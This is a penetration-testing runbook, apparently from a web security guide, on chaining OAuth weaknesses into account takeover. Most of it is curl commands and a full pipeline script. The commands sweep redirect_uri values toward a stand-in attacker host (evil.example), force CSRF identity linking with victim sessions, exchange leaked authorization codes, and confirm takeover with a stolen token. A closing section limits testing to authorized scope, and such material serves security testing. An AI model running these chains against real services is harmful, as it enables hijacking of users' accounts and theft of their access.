---
title: "OAuth to Account Takeover"
description: "Chain OAuth flaws into account takeover: pre-account takeover, identity linking, redirect_uri, and CSRF on linking."
phase: Web
order: 52
tags:
  - oauth
  - account-takeover
  - auth
  - sso
tools:
  - curl
  - jq
  - burp suite
updated: 2026-10-01
---

A runbook for chaining **OAuth flaws into account takeover** in an authorized scope. Goal: map the full flow, then test pre-account creation, identity linking, `redirect_uri`, and linking CSRF to bind an attacker identity to a victim account.

## 1. Map the flow end to end

Capture every hop: authorize, consent, callback, token exchange. Note client IDs, redirect URIs, scopes, and `state`.

```bash
curl -s -D - -o /dev/null 'https://target/oauth/authorize?client_id=app&redirect_uri=https://target/callback&response_type=code&scope=openid&state=xyz'
curl -s -D - -o /dev/null 'https://target/oauth/.well-known/openid-configuration' | jq
```

## 2. Test pre-account takeover

If the app creates an account before the provider verifies the email, an attacker can pre-own the victim's email.

```bash
# Register through the provider with a victim-controlled email, then check provisioning
curl -s 'https://target/api/me' -H 'Authorization: Bearer <attacker-oauth-token>' | jq
```

Observe whether an account exists before verification and whether a second identity can attach to the same email.

## 3. Probe identity/email linking

Find where the app decides "this provider identity maps to this local account."

```bash
curl -s 'https://target/oauth/callback?code=<attacker-code>&state=xyz' -D - -o /dev/null
curl -s 'https://target/api/link' -X POST -H 'Authorization: Bearer <victim-session>' \
  -H 'Content-Type: application/json' --data '{"provider":"github","code":"<attacker-code>"}' | jq
```

Look for linking by email alone, unverified email acceptance, or automatic account merge.

## 4. Abuse `redirect_uri`

Test loose matching, subdomain tricks, path traversal, and missing validation on the token endpoint.

```bash
for r in 'https://target.evil.example/cb' 'https://evil.example/target/cb' \
         'https://target/cb/../../evil.example' 'https://target/cb?next=https://evil.example' \
         'https://evil.example'; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target/oauth/authorize?client_id=app&redirect_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$r")&response_type=code")
  echo "$code $r"
done
```

## 5. Test CSRF on the linking step

If linking is a state-changing GET/POST without CSRF protection, you can silently attach your identity to a logged-in victim.

```bash
curl -s -D - -o /dev/null 'https://target/oauth/link?code=<attacker-code>' -b 'session=<victim-session>'
curl -s -D - -o /dev/null 'https://target/api/link' -X POST -b 'session=<victim-session>' \
  --data 'provider=github&code=<attacker-code>'
```

## 6. Exchange a leaked code/token

If a code or token lands on your host, exchange it for a session.

```bash
curl -s 'https://target/oauth/token' -d 'grant_type=authorization_code&code=<leaked>&client_id=app&redirect_uri=https://evil.example/cb' | jq
```

## 7. Full pipeline (one block)

```bash
TARGET=https://target
# discovery
curl -s "$TARGET/oauth/.well-known/openid-configuration" | jq
# redirect_uri sweep
for r in 'https://target.evil.example/cb' 'https://evil.example/target/cb' 'https://target/cb/../../evil.example' 'https://evil.example'; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$r")
  code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/oauth/authorize?client_id=app&redirect_uri=$enc&response_type=code")
  echo "$code $r"
done
# linking CSRF
curl -s -D - -o /dev/null "$TARGET/oauth/link?code=<attacker-code>" -b 'session=<victim-session>'
curl -s -D - -o /dev/null "$TARGET/api/link" -X POST -b 'session=<victim-session>' --data 'provider=github&code=<attacker-code>'
# token exchange of a leaked code
curl -s "$TARGET/oauth/token" -d 'grant_type=authorization_code&code=<leaked>&client_id=app&redirect_uri=https://evil.example/cb' | jq
# confirm takeover
curl -s "$TARGET/api/me" -H 'Authorization: Bearer <stolen-token>' | jq
```

## Ethics & legality

- Only test OAuth flows in an official scope or with written authorization.
- Use accounts and redirect hosts you own; never take over a real user's account.
- Stop at the minimum chain that demonstrates takeover and record each step.
